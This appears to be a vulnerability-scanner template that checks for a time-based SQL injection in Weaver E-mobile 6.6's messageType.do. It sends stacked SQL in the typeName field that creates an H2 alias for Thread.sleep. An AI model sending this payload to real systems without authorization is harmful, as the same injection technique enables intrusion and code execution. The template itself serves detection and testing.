id: poc-weaver-e-mobile-messagetype-sqli

info:
  name: 泛微E-mobile 6.6 messageType.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 泛微E-mobile

flow: |
  http(1) && http(2)

http:
  - id: check-e-mobile
    method: GET
    path:
      - "{{BaseURL}}/login.do"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "E-Mobile"

  - id: sqli-test
    raw:
      - |
        POST /messageType.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=create&typeName=1';CREATE ALIAS sleep222 FOR "java.lang.Thread.sleep";CALL sleep222(5000);select+'1
      - |
        POST /messageType.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=create&typeName=1';CREATE ALIAS sleep222 FOR "java.lang.Thread.sleep";CALL sleep222(8000);select+'1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "status"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
